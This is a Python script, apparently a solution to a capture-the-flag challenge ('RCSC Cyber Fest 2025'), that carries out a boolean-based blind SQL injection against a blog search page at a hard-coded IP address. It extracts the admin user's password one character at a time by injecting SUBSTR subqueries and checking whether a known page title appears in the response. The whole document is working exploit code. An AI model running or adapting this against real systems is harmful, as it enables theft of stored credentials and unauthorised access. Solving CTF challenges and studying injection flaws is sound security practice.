import string
import requests

url = "http://157.230.32.115:5500/blog.php"  # change if needed

# Only chars that can appear in the flag
inner = string.ascii_lowercase + string.digits + "_"
chars = "RCSC{" + inner + "}"  # be a bit generous

flag = ""

for i in range(1, 60):   # max length guess
    found = False
    for c in chars:
        payload = f"a' OR (SELECT SUBSTR(password,{i},1) FROM users WHERE username='admin')='{c}'--"
        r = requests.get(url, params={"q": payload})

        # success = all blogs shown (same behavior you saw in browser)
        if "RCSC Cyber Fest 2025 Announcement" in r.text:   # use any fixed title from the page
            flag += c
            print(f"[+] pos {i}: {c}  -> {flag}")
            found = True
            break

    if not found:
        print(f"[*] No char at position {i}, stopping.")
        break

print("Final Flag:", flag)
